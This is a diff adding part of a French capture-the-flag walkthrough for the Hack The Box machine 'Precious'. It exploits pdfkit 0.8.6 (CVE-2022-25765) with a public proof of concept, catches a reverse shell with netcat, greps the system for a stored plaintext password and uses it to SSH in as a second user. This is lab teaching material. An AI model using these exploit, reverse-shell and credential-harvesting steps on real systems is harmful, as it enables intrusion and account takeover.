@@ -502,9 +502,184 @@ Cette information oriente la suite de la recherche : tu peux maintenant vérifie
 
 La version `pdfkit v0.8.6` étant maintenant identifiée, tu peux rechercher une vulnérabilité correspondant à cette version.
 
+tu fais un recherche google avec les termes suivants : 
+
+```txt
+pdfkit 0.8.6 exploit github poc -precious
+```
+
+Le filtre `-precious` exclut les résultats contenant le nom de la machine, afin d’éviter les writeups, walkthroughs ou solutions déjà publiés.
+
+![](pdfkit-exploit-google-search.png)
+
+La recherche fait ressortir **CVE-2022-25765**, une vulnérabilité de type **command injection** affectant `pdfkit`.
+
+Parmi les dépots identifiés, choisis le GitHub suivant :
+
+```url
+https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765.git
+```
+
+### Exploitation de CVE-2022-25765
+
+Tu récupères ensuite le dépôt :
+
+```bash
+git clone https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765.git
+cd PDFkit-CMD-Injection-CVE-2022-25765
+```
+
+Avant d’exécuter l’exploit, tu ouvres un listener sur Kali :
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+Dans un second terminal, tu lances l’exploit en indiquant l’URL de la cible, ton IP VPN et le port d’écoute :
+
+```bash
+python3 CVE-2022-25765.py -t http://precious.htb -a 10.10.x.x -p 4444
+```
+
+Réponse :
+
+```bash
+[*] Input target address is http://precious.htb
+[*] Input address for reverse connect is 10.10.x.x
+[*] Input port is 4444
+[!] Run the shell... Press Ctrl+C after successful connection
+```
 
 
----
+
+Côté listener, tu reçois une connexion depuis la cible :
+
+```bash
+connect to [10.10.16.20] from (UNKNOWN) [10.129.x.x] 55376
+bash: cannot set terminal process group (678): Inappropriate ioctl for device
+bash: no job control in this shell
+ruby@precious:/var/www/pdfapp$
+```
+
+La prise de pied est réussie : tu obtiens un shell sur la machine en tant que l’utilisateur `ruby`.
+
+### Exploration de l’environnement de l’utilisateur ruby
+
+Après l’exploitation de `pdfkit`, tu obtiens un shell sur la cible en tant que l’utilisateur `ruby`. Ce premier accès confirme la prise de pied, mais il faut maintenant comprendre l’environnement local avant de chercher une progression vers un autre compte ou une escalade de privilèges.
+
+Tu commences par vérifier l’utilisateur courant, les groupes associés, le nom de la machine et le répertoire dans lequel le shell arrive :
+
+```bash
+whoami
+id
+hostname
+pwd
+```
+
+```bash
+ruby
+uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
+precious
+/var/www/pdfapp
+```
+
+Le shell s’exécute dans le répertoire de l’application web :
+
+```text
+/var/www/pdfapp
+```
+
+Ensuite, tu regardes les répertoires personnels présents sur la machine :
+
+```bash
+ls -la /home
+```
+
+Cette commande révèle deux comptes locaux :
+
+```text
+henry
+ruby
+```
+
+Le compte `ruby` correspond à l’utilisateur obtenu grâce à l’exploitation web.
+Le compte `henry` est donc un autre utilisateur local potentiellement intéressant.
+
+Tu inspectes alors le répertoire personnel de `henry` pour voir ce qu’il contient et quelles permissions sont appliquées :
+
+```bash
+ls -la /home/henry
+```
+
+Résultat :
+
+```text
+-rw-r----- 1 root henry 33 Jun  9 03:44 user.txt
+```
+
+Le fichier `user.txt` est bien présent dans `/home/henry`, mais il n’est pas lisible directement par l’utilisateur `ruby`. Il appartient à `root` et au groupe `henry`, avec des permissions limitées.
+
+À ce stade, l’objectif devient plus clair : trouver une information permettant de passer de `ruby` à `henry`. 
+
+Comme l’accès actuel est lié à une application Ruby, les fichiers de configuration, les répertoires personnels, l’application web, `/opt` et les sauvegardes sont de bons emplacements à examiner.
+
+### Recherche d’informations liées à henry
+
+Comme `henry` est l’utilisateur à atteindre, tu recherches des références à ce nom dans les fichiers accessibles à `ruby`.
+
+Tu limites d’abord la recherche aux emplacements les plus intéressants : les homes utilisateurs, l’application web, `/opt` et les sauvegardes.
+
+```bash
+find /home /var/www /opt /var/backups -type f -readable 2>/dev/null -exec grep -Hni "henry" {} \;
+```
+
+Résultat :
+
+```text
+/home/ruby/.bundle/config:2:BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+```
+
+Le fichier contient des identifiants associés à l’utilisateur `henry`.
+Tu peux donc tenter une connexion SSH avec ce mot de passe.
+
+### Connexion SSH avec l’utilisateur henry
+
+Depuis Kali, tu testes les identifiants trouvés :
+
+```bash
+ssh henry@precious.htb
+```
+
+Mot de passe :
+
+```text
+Q3c1AqGHtoI0aXAYFH
+```
+
+Après authentification, tu vérifies l’utilisateur courant :
+
+```bash
+whoami
+id
+```
+
+Résultat :
+
+```text
+henry
+uid=1000(henry) gid=1000(henry) groups=1000(henry)
+```
+
+Tu peux maintenant lire le flag utilisateur :
+
+```bash
+cat user.txt
+b66cxxxxxxxxxxxxxxxxxxxxxxxx1c0c
+```
+
+La lecture de `user.txt` confirme la fin de la prise de pied : tu as obtenu un accès utilisateur valide sur la cible et tu peux maintenant passer à l’escalade de privilèges.
+
+
 
 ## Escalade de privilèges
 
